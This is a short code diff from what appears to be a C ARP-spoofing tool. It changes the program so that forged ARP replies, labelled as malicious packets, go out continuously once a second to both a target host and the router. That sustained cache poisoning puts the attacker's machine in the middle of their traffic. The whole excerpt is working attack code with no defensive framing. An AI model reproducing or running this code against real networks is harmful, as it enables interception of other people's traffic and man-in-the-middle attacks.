@@ -119,15 +119,21 @@ int main(int argc, const char* argv[]) {
 	ArpPackage maliciousPackage = createArpPackage(ARPOP_REPLY, localInterfaceMacAddress, routerIpAddress, targetMacAddress, targetIpAddress);
 	ArpPackage maliciousRouterPackage = createArpPackage(ARPOP_REPLY, localInterfaceMacAddress, targetIpAddress, routerMacAddress, routerIpAddress);
 	
-	if( sendArpPackage(&maliciousPackage) < 0) {
-		printf("Error 6\n");
-		exit(EXIT_FAILURE);
+	// Continuosly send packages
+	while(1) {
+		if( sendArpPackage(&maliciousPackage) < 0) {
+			printf("Error 6\n");
+			exit(EXIT_FAILURE);
+		}
+	
+		if( sendArpPackage(&maliciousRouterPackage) < 0 ) {
+			printf("Error 7\n");
+			exit(EXIT_FAILURE);
+		}
+		sleep(1);
 	}
 	
-	if( sendArpPackage(&maliciousRouterPackage) < 0 ) {
-		printf("Error 7\n");
-		exit(EXIT_FAILURE);
-	}
+	
 
 	// End of program
 	exit(EXIT_SUCCESS);
